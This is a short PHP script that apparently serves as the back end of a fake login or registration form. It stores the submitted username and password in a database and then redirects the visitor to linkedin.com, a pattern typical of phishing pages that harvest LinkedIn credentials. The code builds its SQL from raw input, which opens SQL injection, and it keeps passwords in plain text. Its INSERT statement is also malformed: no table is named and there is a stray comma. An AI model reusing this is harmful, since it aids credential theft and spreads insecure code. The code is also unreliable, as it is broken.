<?php

include("connection.php");


$username = $_POST['username'];
$password = $_POST['password'];

$insert = "INSERT INTO (username, password), VALUES ('$username', '$password')";

if (mysqli_query($connection, $insert)) {
    echo "Registro exitoso";
    header('location: https://www.linkedin.com/');
    exit();
} else {
    echo "Error: " . mysqli_error($connection);
}

?>